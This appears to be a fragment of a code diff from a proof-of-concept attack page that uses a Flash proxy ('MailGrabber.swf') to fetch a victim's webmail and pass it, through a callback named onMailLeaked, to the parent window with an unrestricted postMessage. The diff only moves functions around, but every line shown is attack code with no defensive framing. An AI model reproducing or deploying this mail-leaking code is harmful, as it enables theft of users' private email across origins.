@@ -4,8 +4,9 @@ var BOOTSTRAP_REGEX = /[\s\S]+<script>(\(function\(NC\)\{NC\.ulPadding=.*?)<\/sc
 
 var NeoConfig = {};
 
-function deflashify(flashed) {
-    return JSON.parse(decodeURIComponent(flashed));
+// This will be called by `MailGrabber.swf` after it loads
+function flasherReady() {
+    flashProxy(FETCH_MAIL_URL, "", "onMailLeaked");
 }
 
 function flashProxy(url, data, callback_name) {
@@ -39,9 +40,8 @@ function onMailLeaked(status, data) {
     window.parent.postMessage(prettyMsgs, "*");
 }
 
-// This will be called by `MailGrabber.swf`
-function flasherReady() {
-    flashProxy(FETCH_MAIL_URL, "", "onMailLeaked");
+function deflashify(flashed) {
+    return JSON.parse(decodeURIComponent(flashed));
 }
 
 </script>
